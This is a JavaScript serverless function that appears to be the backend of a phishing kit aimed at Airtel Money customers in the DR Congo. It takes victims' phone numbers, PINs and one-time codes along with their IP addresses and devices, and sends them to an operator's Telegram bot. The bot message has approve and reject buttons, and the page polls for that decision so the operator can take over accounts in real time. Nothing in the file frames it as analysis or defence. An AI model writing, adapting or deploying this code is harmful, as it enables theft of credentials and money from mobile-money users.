import { getStore } from "@netlify/blobs";

export default async (req, context) => {
  const url = new URL(req.url);

  if (req.method === "GET") {
    const id = url.searchParams.get("requestId");
    if (!id) return json({ status: "pending" });

    try {
      const store = getStore("status");
      const status = (await store.get(id)) || "pending";
      return json({ status });
    } catch (err) {
      console.error("Blobs GET error:", err);
      return json({ status: "pending" });
    }
  }

  if (req.method === "POST") {
    let body;
    try {
      body = await req.json();
    } catch {
      return json({ error: "invalid_json" }, 400);
    }

    const { type, phone, pin, otp, plan, amount, trial } = body;
    if (!type || !phone) return json({ error: "missing_fields" }, 400);

    const requestId = crypto.randomUUID().replace(/-/g, "").slice(0, 12);
    const ip = req.headers.get("x-nf-client-connection-ip") || req.headers.get("x-forwarded-for") || "N/A";
    const ua = (req.headers.get("user-agent") || "N/A").slice(0, 60);
    const now = new Date().toISOString().replace("T", " ").slice(0, 19);

    const lines = [
      `🔐 <b>Nouvelle Demande Airtel Money</b>`,
      `━━━━━━━━━━━━━━━━━━━━`,
      `🔖 <b>Étape :</b> <code>${type === "pin" ? "MOBILE + PIN" : "VÉRIFICATION OTP"}</code>`,
      `📱 <b>Mobile :</b> +243 <code>${escapeHtml(phone)}</code>`,
      type === "pin" ? `🔐 <b>Épingle :</b> <code>${escapeHtml(pin || "")}</code>` : null,
      type === "otp" ? `🔑 <b>Code OTP :</b> <code>${escapeHtml(otp || "")}</code>` : null,
      `📦 <b>Forfait :</b> <code>${escapeHtml(plan || "N/A")}</code>`,
      amount ? `💰 <b>Montant :</b> <code>${Number(amount).toLocaleString("fr-CD")} CDF</code>` : null,
      `🔢 <b>Tentative :</b> <code>${trial} / 3</code>`,
      `🌐 <b>IP :</b> <code>${escapeHtml(ip)}</code>`,
      `📱 <b>Appareil :</b> <code>${escapeHtml(ua)}</code>`,
      `🕒 <b>Heure :</b> <code>${now}</code>`,
      `🆔 <b>ID :</b> <code>${requestId}</code>`,
      `━━━━━━━━━━━━━━━━━━━━`,
      `<i>Sélectionnez une action :</i>`,
    ].filter(Boolean).join("\n");

    try {
      const tgRes = await fetch(`https://api.telegram.org/bot${process.env.TG_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: process.env.TG_CHAT_ID,
          text: lines,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [[
              { text: "✅ APPROUVER", callback_data: `approve:${requestId}` },
              { text: "❌ REJETER", callback_data: `reject:${requestId}` },
            ]],
          },
        }),
      });

      if (!tgRes.ok) {
        const errorText = await tgRes.text();
        console.error("Telegram API error:", errorText);
        return json({ error: "telegram_failed", details: errorText }, 502);
      }

      const store = getStore("status");
      await store.set(requestId, "pending");

      return json({ ok: true, requestId });
    } catch (err) {
      console.error("Function error:", err);
      return json({ error: "internal_server_error", message: err.message }, 500);
    }
  }

  return json({ error: "method_not_allowed" }, 405);
};

function escapeHtml(s) {
  return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

function json(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { "Content-Type": "application/json" },
  });
}